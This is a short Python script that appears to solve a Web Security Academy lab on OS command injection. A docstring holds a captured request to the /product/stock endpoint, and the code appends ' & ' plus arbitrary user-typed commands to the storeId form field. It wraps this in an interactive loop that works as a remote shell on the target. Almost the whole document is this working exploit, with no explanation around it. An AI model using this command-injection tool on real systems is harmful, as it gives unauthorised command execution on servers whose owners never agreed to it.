'''POST /product/stock HTTP/2
Host: 0a1e005f042db23c830b7814000700a2.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a1e005f042db23c830b7814000700a2.web-security-academy.net/product?productId=1&whoami
Content-Type: application/x-www-form-urlencoded
Content-Length: 21
Origin: https://0a1e005f042db23c830b7814000700a2.web-security-academy.net
Connection: keep-alive
Cookie: session=BwKgWurbxhPjXYvOocT1rMnY9zX1v6bC
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
TE: trailers

productId=1&storeId=1
'''
import requests
import urllib.parse


DOMAIN = "0a1e005f042db23c830b7814000700a2.web-security-academy.net"
HEADERS = {
    "Host": DOMAIN,
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Referer": f"https://{DOMAIN}/product?productId=1&whoami",
    "Content-Type": "application/x-www-form-urlencoded",
    "Origin": f"https://{DOMAIN}",
    "Connection": "keep-alive",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "TE": "trailers"
}

COOKIES = {
    "session": "BwKgWurbxhPjXYvOocT1rMnY9zX1v6bC"
}

def execute_rce(command):
    data = {
        "productId": "1",
        "storeId": "1" + " & " + command
    }
    response = requests.post(f"https://{DOMAIN}/product/stock", headers=HEADERS, cookies=COOKIES, data=data)
    return response.text

def main():
    while True:
        command = str(input("Enter command to execute: "))
        print(execute_rce(command))

if __name__ == "__main__":
    main()